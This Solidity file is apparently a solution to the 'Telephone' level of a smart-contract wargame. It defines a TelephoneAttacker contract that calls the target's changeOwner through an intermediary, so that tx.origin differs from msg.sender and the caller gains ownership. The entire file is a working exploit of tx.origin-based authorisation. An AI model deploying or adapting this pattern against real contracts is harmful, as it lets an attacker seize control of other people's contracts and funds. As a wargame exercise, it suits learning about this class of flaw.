// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./4-Telephone.sol";

contract TelephoneAttacker {
    Telephone public telephone;

    constructor(address TelephoneAddress) public {
        telephone = Telephone(TelephoneAddress);
    }

    function changeOwner() external {
        telephone.changeOwner(msg.sender);
    }
}
